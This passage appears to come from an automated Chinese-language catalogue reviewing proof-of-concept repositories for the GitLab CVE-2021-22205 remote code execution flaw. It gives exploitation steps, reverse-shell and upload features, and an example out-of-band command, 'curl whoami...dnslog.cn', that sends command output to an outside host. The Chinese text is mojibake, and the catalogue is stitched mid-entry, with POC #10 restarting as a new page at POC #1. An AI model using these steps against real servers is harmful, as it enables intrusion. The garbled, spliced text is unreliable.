5.  **RCEï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [ZZ-SOCMAP/CVE-2021-22205](https://github.com/ZZ-SOCMAP/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #6

**æ¥æº**: [CVE-2021-22205-c0okB_CVE-2021-22205.md](../2021/CVE-2021-22205-c0okB_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´žPOCæœ‰æ•ˆã€‚æ¼æ´žåº“ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡æ¼æ´žï¼ŒCISA KEVä¸­ä¹Ÿæ ‡è®°ä¸ºå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´žï¼Œç»“åˆæä¾›çš„ä»£ç ï¼Œè¯æ˜Žè¯¥æ¼æ´žå­˜åœ¨ä¸”å®¹æ˜“è¢«åˆ©ç”¨ã€‚

**æŠ•æ¯’é£Žé™©:**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œè¯¥ä»£ç ä¸»è¦å®žçŽ°äº†ä»¥ä¸‹åŠŸèƒ½ï¼š

*   DNSLog æŽ¢æµ‹ï¼šé€šè¿‡ DNSLog éªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ã€‚
*   RCEï¼šåˆ©ç”¨ Postbin è¿›è¡Œå¸¦å¤–å‘½ä»¤æ‰§è¡Œã€‚
*   åå¼¹ Shellï¼šåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚
*   ä¸Šä¼ æ–‡ä»¶ï¼šé€šè¿‡ http åè®®ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆéœ€è¦ VPSï¼‰ã€‚

ä»£ç ä¸»è¦é›†ä¸­åœ¨æ¼æ´žåˆ©ç”¨ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è¯¥å·¥å…·éœ€è¦ä½¿ç”¨è€…æä¾›ç›®æ ‡URLå’Œå‘½ä»¤ï¼Œæˆ–è€…åå¼¹shellåœ°å€ï¼Œæ²¡æœ‰å‘çŽ°ä½œè€…é¢„ç•™åŽé—¨çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œè¯„ä¼°ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´žæ£€æµ‹:**  ä½¿ç”¨ `-m detect`  é€‰é¡¹ï¼Œé€šè¿‡ DNSLog éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚ç¨‹åºä¼šç”Ÿæˆä¸€ä¸ªåŒ…å« DNS æŸ¥è¯¢è¯·æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žï¼Œä¼šå‘æŒ‡å®šçš„ DNSLog æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€ŒéªŒè¯æ¼æ´žã€‚
2.  **å‘½ä»¤æ‰§è¡Œ:**
    *   ä½¿ç”¨ `-m rce1` é€‰é¡¹ï¼Œé€šè¿‡ Postbin æ‰§è¡Œå‘½ä»¤ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†ç»“æžœå‘é€åˆ° Postbinã€‚
3.  **åå¼¹ Shell:** ä½¿ç”¨ `-m rev` é€‰é¡¹ï¼Œåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«åå¼¹ shell å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œåå¼¹ shell å‘½ä»¤ï¼Œä»Žè€Œå»ºç«‹ä¸Žæ”»å‡»è€…æœåŠ¡å™¨çš„è¿žæŽ¥ã€‚
4.  **æ–‡ä»¶ä¸Šä¼ :** ä½¿ç”¨ `-m upload` é€‰é¡¹ï¼Œä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«è¦ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶å°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šä½ç½®ã€‚

æ­¤æ¼æ´žåˆ©ç”¨çš„å…³é”®åœ¨äºŽåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ—¶ï¼Œç”±äºŽæœªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æž„é€ æ¶æ„å›¾ç‰‡ï¼Œåœ¨ExifToolæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚


**é¡¹ç›®åœ°å€:** [c0okB/CVE-2021-22205](https://github.com/c0okB/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #7

**æ¥æº**: [CVE-2021-22205-cc3305_CVE-2021-22205.md](../2021/CVE-2021-22205-cc3305_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯è®¿é—®è¯¥å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆDjVu æ–‡ä»¶ï¼‰åˆ° GitLab æœåŠ¡å™¨ï¼Œå…¶ä¸­å›¾åƒæ–‡ä»¶çš„å…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ã€‚å½“ GitLab ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§ä¸ºâ€œä¸¥é‡ (CRITICAL)â€ï¼ŒCVSS è¯„åˆ†é«˜è¾¾ 10 åˆ†ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žå½±å“èŒƒå›´å¹¿ä¸”å®¹æ˜“åˆ©ç”¨ã€‚æä¾›çš„ POC ä»£ç  `CVE-2021-22205.py` æ—¨åœ¨åˆ©ç”¨æ­¤æ¼æ´žã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æŸ¥æ‰¾CSRF token:** è„šæœ¬é¦–å…ˆå°è¯•ä»Ž `/users/sign_in` é¡µé¢èŽ·å– CSRF tokenï¼Œå› ä¸ºä¸Šä¼ æ–‡ä»¶éœ€è¦æœ‰æ•ˆçš„ CSRF tokenã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æå– tokenã€‚
2.  **æž„å»ºæ¶æ„DjVuæ–‡ä»¶ä¸Šä¼ è¯·æ±‚:** ç„¶åŽï¼Œè„šæœ¬æž„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DjVu æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ï¼ŒGitLab æœåŠ¡å™¨ä¼šä½¿ç”¨ ExifTool å¤„ç†è¯¥æ–‡ä»¶ã€‚
3.  **è§¦å‘å‘½ä»¤æ‰§è¡Œ:** å½“ ExifTool å¤„ç†è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥åœ¨æ–‡ä»¶å…ƒæ•°æ®ä¸­çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
è™½ç„¶æä¾›çš„ä»£ç çœ‹èµ·æ¥åŠŸèƒ½æ˜Žç¡®ï¼Œä½†å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ã€‚å…·ä½“è¡¨çŽ°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–æ€§é£Žé™©:** è¯¥è„šæœ¬ä¾èµ–äºŽ `requests` æ¨¡å—ã€‚è™½ç„¶è¿™æ˜¯å¾ˆå¸¸è§çš„æ¨¡å—ï¼Œå¦‚æžœä½œè€…ä¿®æ”¹äº†ä»£ç ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä½¿å…¶å®‰è£…äº†æ¶æ„ä¾èµ–ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªæŠ•æ¯’ç‚¹ã€‚
*   **ä»£ç†é…ç½®åˆ©ç”¨:** è„šæœ¬æ”¯æŒé€šè¿‡ä»£ç†æœåŠ¡å™¨è¿žæŽ¥ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æä¾›æ¶æ„çš„ä»£ç†æœåŠ¡å™¨åœ°å€æ¥çªƒå–å—å®³è€…çš„å‡­æ®æˆ–æ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚
*   **å‘½ä»¤æ‰§è¡Œçš„éšè”½æ€§ï¼š** å¦‚æžœä¸Šä¼ çš„payloadåŒ…å«åå¼¹shell, åˆ™è„šæœ¬å¯èƒ½ä¼šå°è¯•å»ºç«‹åå‘ shell è¿žæŽ¥æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œè€Œéš¾ä»¥æ£€æµ‹ã€‚
*   **ç‰ˆæœ¬éªŒè¯ç»•è¿‡:** è„šæœ¬ä¸­çš„ç‰ˆæœ¬éªŒè¯å¯èƒ½å­˜åœ¨ç»•è¿‡çš„é£Žé™©ï¼Œå³ä½¿ç”¨æˆ·ä¿®å¤äº†æ¼æ´žï¼Œè„šæœ¬ä»ç„¶å°è¯•åˆ©ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–æœªçŸ¥çš„å®‰å…¨é—®é¢˜ã€‚

ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£Žé™©çº¦ä¸º 10%ã€‚ä¸»è¦åŽŸå› æ˜¯è¯¥è„šæœ¬çš„åŠŸèƒ½è¾ƒä¸ºé›†ä¸­ï¼Œä¸”ä¾èµ–æ¨¡å—è¾ƒå°‘ã€‚ä½†ä»ç„¶éœ€è¦å¯¹è„šæœ¬è¿›è¡Œä»”ç»†å®¡æŸ¥ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [cc3305/CVE-2021-22205](https://github.com/cc3305/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #8

**æ¥æº**: [CVE-2021-22205-ccordeiro_CVE-2021-22205.md](../2021/CVE-2021-22205-ccordeiro_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®ï¼Œä¸”æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 å­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ `/users/sign_in`ï¼ŒèŽ·å– CSRF tokenã€‚ 
2.  ç„¶åŽï¼Œæ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚è¯¥æ–‡ä»¶ä¸­çš„ metadata å­—æ®µåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ `curl whoami.82sm53.dnslog.cn` æˆ–å…¶ä»–æ¶æ„æŒ‡ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ­¤ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚è¯·æ±‚å¤´ä¸­åŒ…å«ä¹‹å‰èŽ·å–çš„ CSRF tokenã€‚
4.  GitLab åœ¨å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼ŒExifTool ä¼šæ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„PoCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ExifToolå…ƒæ•°æ®ï¼Œå¯ä»¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚PoCä»£ç é¦–å…ˆèŽ·å–CSRF Tokenï¼Œç„¶åŽæž„é€ åŒ…å«payloadçš„multipart/form-dataè¯·æ±‚ï¼Œå‘é€åˆ°`/uploads/user`ç«¯ç‚¹ã€‚å¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žä¸”æœªæ‰“è¡¥ä¸ï¼ŒPoCä¼šæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**
æä¾›çš„PoCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚ç»è¿‡åˆ†æžï¼Œä»£ç ä¸­æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æ¶æ„é€»è¾‘æˆ–åŽé—¨ã€‚ é£Žé™©è¾ƒä½Žï¼Œ ä½†æ˜¯å¹¶ä¸èƒ½æŽ’é™¤ä½œè€…åœ¨ä»£ç ä¸­éšè—äº†ä¸æ˜“å¯Ÿè§‰çš„æŠ•æ¯’ä»£ç ã€‚ä¾‹å¦‚é€šè¿‡ç½‘ç»œåŠ è½½æ¶æ„ä»£ç ç­‰ã€‚æ‰€ä»¥è¿™é‡Œè¯„ä¼°çš„æŠ•æ¯’é£Žé™©ä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [ccordeiro/CVE-2021-22205](https://github.com/ccordeiro/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #9

**æ¥æº**: [CVE-2021-22205-devdanqtuan_CVE-2021-22205.md](../2021/CVE-2021-22205-devdanqtuan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ GitLab å®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—® GitLab å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Tokenï¼Œè¯¥ Token å¯é€šè¿‡è®¿é—®ç™»å½•é¡µé¢èŽ·å¾—ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åˆ©ç”¨ ExifTool çš„æ¼æ´žï¼Œåœ¨è§£æžå…ƒæ•°æ®æ—¶æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab çš„å¤´åƒä¸Šä¼ æŽ¥å£ `/uploads/user`ã€‚
4.  GitLab è°ƒç”¨ ExifTool è§£æžå›¾åƒæ–‡ä»¶ï¼ŒExifTool æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**

æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒæ¨¡æ‹Ÿäº†ä¸Šè¿°åˆ©ç”¨æµç¨‹ï¼Œèƒ½å¤ŸæˆåŠŸè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ã€‚POC é€šè¿‡æž„é€ æ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ï¼Œå°†å‘½ä»¤æ³¨å…¥åˆ° ExifTool å¯ä»¥è§£æžçš„å…ƒæ•°æ®ä¸­ã€‚ä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡åˆ°å­˜åœ¨æ¼æ´žçš„GitLabæœåŠ¡å™¨ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

ä»£ç æ•´ä½“æ˜¯ç”¨äºŽå¤çŽ°æ¼æ´žï¼Œä½†å­˜åœ¨å¾®å°çš„æŠ•æ¯’é£Žé™©ã€‚ä¸»è¦é£Žé™©ç‚¹åœ¨äºŽæ”»å‡»å‘½ä»¤çš„æž„é€ ä»¥åŠæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹`target_url`æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è€ƒè™‘åˆ°POCæœ¬èº«å°±æ˜¯æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ‰€ä»¥æ­£å¸¸ä½¿ç”¨åœºæ™¯ä¸‹æ˜¯æ²¡é—®é¢˜çš„ã€‚é™¤éžï¼Œæœ‰äººæ•…æ„é­”æ”¹æ­¤ä»£ç ï¼Œæˆ–è€…åœ¨æ‰¹é‡æµ‹è¯•æ—¶ï¼Œä½¿ç”¨è€…æœªæ£€æŸ¥urlï¼Œå¯èƒ½ä¼šæœ‰ä¸€å®šé£Žé™©ã€‚æ•…è®¤ä¸ºæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œçº¦ä¸º1%ã€‚

**ä¼˜å…ˆçº§:**

ç”±äºŽæœç´¢å¼•æ“Žæ²¡æœ‰æä¾›ç»“æžœï¼Œå› æ­¤ä¼˜å…ˆçº§ä¸ºæ¼æ´žåˆ©ç”¨ä»£ç  > æ¼æ´žåº“ä¿¡æ¯ã€‚

**é¡¹ç›®åœ°å€:** [devdanqtuan/CVE-2021-22205](https://github.com/devdanqtuan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #10

**æ¥æº**: [CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md](../2021/CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md)

# CVE-2021-22205

> ðŸ“¦ è¯¥CVEæœ‰ **24** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2021-22205-Al1ex_CVE-2021-22205.md](../2021/CVE-2021-22205-Al1ex_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œä¸”ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab å¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ 11.9 åˆ° 13.8.8ï¼Œ13.9 åˆ° 13.9.6 ä»¥åŠ 13.10 åˆ° 13.10.3ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’ŒPOCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç é€šè¿‡æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åµŒå…¥äº†å‘½ä»¤ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾åƒæ—¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚POCä»£ç èƒ½å¤ŸæˆåŠŸåˆ©ç”¨æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

å¯¹POCä»£ç çš„æŠ•æ¯’é£Žé™©åˆ†æžå¦‚ä¸‹ï¼š

*   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žï¼Œç»“æž„æ¸…æ™°ï¼Œç›®çš„æ˜¯æž„é€ æ¶æ„å›¾ç‰‡å¹¶å‘é€è¯·æ±‚ã€‚
